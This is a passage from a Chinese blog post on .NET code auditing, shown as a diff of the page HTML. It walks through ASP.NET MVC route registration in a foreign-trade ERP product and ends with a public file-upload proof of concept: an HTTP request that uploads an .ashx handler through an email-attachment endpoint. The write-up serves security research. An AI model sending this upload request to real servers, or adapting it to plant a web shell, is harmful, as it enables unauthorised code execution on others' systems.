+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011041.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202408301011041.png-water_print" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">JoinfAppAreaRegistration</span> <span class="p">:</span> <span class="n">AreaRegistration</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里定义了一个名为 <code>JoinfAppAreaRegistration</code> 的类，它继承自 <code>AreaRegistration</code> 类。<code>AreaRegistration</code> 是 ASP.NET MVC 中用于注册区域的基类。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">override</span> <span class="kt">string</span> <span class="n">AreaName</span> <span class="p">=&gt;</span> <span class="s">&#34;JoinfApp&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该属性定义了区域的名称为 <code>&quot;JoinfApp&quot;</code>。这个名称用于标识和访问该区域。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">override</span> <span class="k">void</span> <span class="n">RegisterArea</span><span class="p">(</span><span class="n">AreaRegistrationContext</span> <span class="n">context</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>RegisterArea</code> 方法是重写自 <code>AreaRegistration</code> 基类的一个抽象方法，用于注册该区域的路由。<code>AreaRegistrationContext</code> 参数提供了对当前区域路由的上下文信息。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">context</span><span class="p">.</span><span class="n">MapRoute</span><span class="p">(</span><span class="s">&#34;Index&#34;</span><span class="p">,</span> <span class="s">&#34;JoinfApp/Index&#34;</span><span class="p">,</span> <span class="k">new</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">controller</span> <span class="p">=</span> <span class="s">&#34;Mobile&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="p">=</span> <span class="s">&#34;Index&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">AreaName</span> <span class="p">=</span> <span class="s">&#34;JoinfApp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段代码为该区域定义了一个名为 <code>&quot;Index&quot;</code> 的路由。此路由将 URL 模式 <code>&quot;JoinfApp/Index&quot;</code> 映射到 <code>Mobile</code> 控制器的 <code>Index</code> 操作方法，并且将 <code>AreaName</code> 设置为 <code>&quot;JoinfApp&quot;</code>。具体来说：</p>
+<ul>
+<li>URL 模式 <code>&quot;JoinfApp/Index&quot;</code> 将匹配类似 <code>http://xx/JoinfApp/Index</code> 的请求。</li>
+<li>该请求将被路由到 <code>MobileController</code> 的 <code>Index</code> 方法。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">context</span><span class="p">.</span><span class="n">MapRoute</span><span class="p">(</span><span class="s">&#34;JoinfApp_default&#34;</span><span class="p">,</span> <span class="s">&#34;JoinfApp/{controller}/{action}/{id}&#34;</span><span class="p">,</span> <span class="k">new</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="p">=</span> <span class="s">&#34;Index&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">id</span> <span class="p">=</span> <span class="n">UrlParameter</span><span class="p">.</span><span class="n">Optional</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此处定义了一个名为 <code>&quot;JoinfApp_default&quot;</code> 的默认路由，用于匹配区域内的大多数请求。它的 URL 模式是 <code>&quot;JoinfApp/{controller}/{action}/{id}&quot;</code>，该路由可以匹配类似 <code>http://xx/JoinfApp/ControllerName/ActionName/123</code> 的请求。</p>
+<ul>
+<li><code>{controller}</code> 是控制器名称的占位符。</li>
+<li><code>{action}</code> 是操作方法名称的占位符，默认值是 <code>&quot;Index&quot;</code>。</li>
+<li><code>{id}</code> 是可选的参数，默认为空。</li>
+</ul>
+<p>因此 payload 呼之欲出(公开漏洞，无风险)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/JoinfApp/EMail/UploadEmailAttr?name=.ashx</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span><span class="l"> </span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;% @ webhandler language=&#34;C#&#34; class=&#34;AverageHandler&#34; %&gt;
+</span></span><span class="line"><span class="cl">using System;
+</span></span><span class="line"><span class="cl">using System.Web;
+</span></span><span class="line"><span class="cl">using System.IO;
+</span></span><span class="line"><span class="cl">using System.Threading.Tasks;
+</span></span><span class="line"><span class="cl">public class AverageHandler : IHttpHandler
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public bool IsReusable
+</span></span><span class="line"><span class="cl">    { get { return false; } }
+</span></span><span class="line"><span class="cl">    public void ProcessRequest(HttpContext ctx)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        ctx.Response.Write(&#34;POC_TEST&#34;);
+</span></span><span class="line"><span class="cl">        Task.Run(async () =&gt;
+</span></span><span class="line"><span class="cl">        {
+</span></span><span class="line"><span class="cl">            File.Delete(ctx.Server.MapPath(ctx.Request.FilePath));
+</span></span><span class="line"><span class="cl">        });
+</span></span><span class="line"><span class="cl">        ctx.Response.Flush();
+</span></span><span class="line"><span class="cl">        ctx.Response.End();
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="8-参考">8. 参考</h1>
+<p><a href="https://github.com/wy876/POC/raw/f98270a2af8444ba6a1733888bf9c95560d0970e/%e5%af%8c%e9%80%9a%e5%a4%a9%e4%b8%8b%e5%a4%96%e8%b4%b8ERP/%e5%af%8c%e9%80%9a%e5%a4%a9%e4%b8%8b%e5%a4%96%e8%b4%b8ERP%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e.md" title="https://github.com/wy876/POC/raw/f98270a2af8444ba6a1733888bf9c95560d0970e/富通天下外贸ERP/富通天下外贸ERP任意文件上传漏洞.md" target="_blank" rel="noopener noreffer">https://github.com/wy876/POC/raw/f98270a2af8444ba6a1733888bf9c95560d0970e/富通天下外贸ERP/富通天下外贸ERP任意文件上传漏洞.md</a></p>
+<p><a href="https://wiki.owasp.org/index.php/Category:OWASP_WebGoat.NET" title="https://wiki.owasp.org/index.php/Category:OWASP_WebGoat.NET" target="_blank" rel="noopener noreffer">https://wiki.owasp.org/index.php/Category:OWASP_WebGoat.NET</a></p>
+<p><a href="https://www.freebuf.com/vuls/398034.html" title="https://www.freebuf.com/vuls/398034.html" target="_blank" rel="noopener noreffer">https://www.freebuf.com/vuls/398034.html</a></p>
+<p><a href="https://xz.aliyun.com/t/15033" title="https://xz.aliyun.com/t/15033" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/15033</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-08-30</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/" data-title="dotnet代码审计系列(一)"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/" data-title="dotnet代码审计系列(一)"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/" data-title="dotnet代码审计系列(一)"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="prev" rel="prev" title="Kubernetes Pod 横向移动"><i class="fas fa-angle-left fa-fw"></i>Kubernetes Pod 横向移动</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
